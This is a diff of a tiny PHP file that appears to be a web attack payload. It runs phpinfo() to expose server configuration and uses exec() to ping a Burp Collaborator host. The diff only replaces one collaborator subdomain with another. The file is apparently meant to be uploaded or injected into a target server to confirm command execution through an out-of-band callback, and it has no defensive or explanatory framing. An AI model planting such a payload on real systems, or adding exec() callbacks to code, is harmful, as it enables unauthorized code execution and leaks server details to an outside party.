@@ -1,4 +1,4 @@
 <?php
 phpinfo();
-exec('ping 8x6we4irzia585e27wcvilnualgp4e.burpcollaborator.net');
+exec('ping g4lmfqu0y97o8ys0ra21mffcm3s4gt.burpcollaborator.net');
 ?>
